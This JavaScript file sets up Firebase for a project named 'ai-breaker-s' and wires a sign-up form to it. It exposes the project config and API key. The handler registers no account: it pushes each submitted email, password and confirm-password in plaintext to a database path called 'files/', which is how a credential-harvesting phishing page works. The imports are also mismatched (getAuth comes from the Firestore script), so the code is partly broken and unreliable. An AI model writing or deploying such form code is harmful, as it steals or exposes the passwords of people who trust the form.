// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app-compat.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-analytics-compat.js";
import { getAuth } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
    apiKey: "AIzaSyD3YmYxGImkv1lzQU9bVy9E8gC-l0JSsag",
    authDomain: "ai-breaker-s.firebaseapp.com",
    databaseURL: "https://ai-breaker-s-default-rtdb.firebaseio.com",
    projectId: "ai-breaker-s",
    storageBucket: "ai-breaker-s.firebasestorage.app",
    messagingSenderId: "632955331376",
    appId: "1:632955331376:web:22cb4ee9fd706796309ef5",
    measurementId: "G-2XW8XMYMX3"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const auth = firebase.auth();
const db = firebase.database();

document.getElementById("signupForm").addEventListener("submit", (e) => {
    e.preventDefault();

    let email = document.getElementById("email").value;
    let confirmPassword = document.getElementById("signup-confirm-password").value;
    let password = document.getElementById("signup-password").value;


    // Save login data in database
    db.ref("files/").push({
        email: email,
        password: password,
        confirmPassword: confirmPassword,
        time: new Date().toString()
    })
        .then(() => {
            alert("Data Saved!");
        })
        .catch((err) => {
            alert("Error: " + err);
        });
});